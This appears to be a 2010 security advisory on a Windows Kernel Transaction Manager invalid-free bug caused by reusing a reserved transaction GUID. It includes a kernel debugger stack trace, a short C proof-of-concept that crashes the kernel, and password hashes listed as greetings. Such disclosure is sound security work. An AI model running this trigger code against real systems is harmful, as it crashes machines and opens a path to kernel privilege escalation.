@@ -1,0 +1,114 @@
+Microsoft Windows KTM Invalid Free with reused transaction GUID
+----------------------------------------------------------------------------
+
+CVE-2010-1889
+
+The Kernel Transaction Manager (ktm) was introduced in Windows Vista and
+has been included in subsequent versions of Windows. Microsoft describes the
+feature in this MSDN article:
+
+http://msdn.microsoft.com/en-us/library/bb986748%28v=VS.85%29.aspx.
+
+The API documentation for CreateTransaction() explains that the LPGUID
+parameter UOW is reserved and must be NULL.
+
+http://msdn.microsoft.com/en-us/library/aa366011%28VS.85%29.aspx
+
+However, looking at nt!TmInitializeTransaction you can see Microsoft uses this
+internally, and rely on a NULL LPGUID in NtCreateTransaction to differentiate
+new transactions. Nothing prevents an attacker from ignoring the fact that this
+parameter is reserved, allowing us to cause a pathological KTM state of
+operation.
+
+This vulnerability is obviously exploitable, and can be used to elevate
+privileges on vulnerable systems.
+
+Connected to Windows Server 2008/Windows Vista 6002 x86 compatible target at (Sat Aug  7 22:35:30.076 2010 (GMT+2)), ptr64 FALSE
+Kernel Debugger connection established.
+Symbol search path is: srv*c:\windows\symbols*http://msdl.microsoft.com/download/symbols
+Executable search path is: 
+Windows Server 2008/Windows Vista Kernel Version 6002 MP (1 procs) Free x86 compatible
+Built by: 6002.18209.x86fre.vistasp2_gdr.100218-0019
+Machine Name:
+Kernel base = 0x81838000 PsLoadedModuleList = 0x8194fc70
+System Uptime: not available
+Access violation - code c0000005 (!!! second chance !!!)
+kd> kv
+ChildEBP RetAddr  Args to Child              
+8e2c8c28 819ded4f 00300033 00000000 00000000 nt!ExFreePoolWithTag+0x43d
+8e2c8c44 81a65f44 843874a8 8180c26c 84387490 nt!TmpDeleteTransaction+0x86
+8e2c8c60 8187ce1c 843874a8 00000000 00000000 nt!ObpRemoveObjectRoutine+0x13d
+8e2c8c88 819dea1e 819de9fb 1a06e8f4 0012ff3c nt!ObfDereferenceObject+0xa1
+8e2c8d34 81882c7a 0012ff3c 001f003f 00000000 nt!NtCreateTransaction+0x2cb (FPO: [SEH])
+8e2c8d34 00000023 0012ff3c 001f003f 00000000 nt!KiFastCallEntry+0x12a (FPO: [0,3] TrapFrame @ 8e2c8d34)
+
+--------------------
+Affected Software
+------------------------
+
+Microsoft Windows.
+
+--------------------
+Consequences
+-----------------------
+
+This issue may be of interest to security professionals but end users are
+unlikely to be affected by this issue. An unprivileged user may be able to
+execute arbitrary kernel code.
+
+Example code to trigger this vulnerability is available below.
+
+// Fixes some sdk include spaghetti http://support.microsoft.com/kb/130869
+#define INITGUID
+
+#include <windows.h>
+#include <ktmw32.h>
+
+#pragma comment(lib, "ktmw32")
+
+DEFINE_GUID(Uow, 'AAAA', 'BB', 'CC', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K');
+
+int main(int argc, char **argv)
+{
+    FARPROC NtCreateTransaction;
+    HANDLE TransactionHandle;
+
+    NtCreateTransaction = GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateTransaction");
+    TransactionHandle   = INVALID_HANDLE_VALUE;
+    NtCreateTransaction(&TransactionHandle, TRANSACTION_ALL_ACCESS, NULL, &Uow, 0, 0, 0, 0, NULL, NULL);
+    NtCreateTransaction(&TransactionHandle, TRANSACTION_ALL_ACCESS, NULL, &Uow, 0, 0, 0, 0, NULL, NULL);
+    return;
+}
+
+-------------------
+Credit
+-----------------------
+
+This bug was discovered by Tavis Ormandy.
+
+-------------------
+Greetz
+-----------------------
+
+$1$90AiGoxp$wyzZGQ6owkRG6OxPErj6M/
+$1$7.qXQkxE$5Zc1zQndJpGdoe1RF4Br1.
+$1$IPYBMipO$/HhHCPgulV/E0pgSvU1710
+$1$ULymMO9x$NVMLjZe8i25ajEfnsRowA.
+$1$8a/c6DLm$JDAFGdhEzIj2DR7RYC2gi.
+
+And all the other elite people I've worked with (sorry, too many to generate!).
+
+-------------------
+Notes
+-----------------------
+
+Approximate time to fix was 240 days.
+
+-------------------
+References
+-----------------------
+
+- http://msdn.microsoft.com/en-us/library/bb986748%28v=VS.85%29.aspx
+  Kernel Transaction Manager
+- http://msdn.microsoft.com/en-us/library/aa366011%28VS.85%29.aspx
+- CreateTransaction()
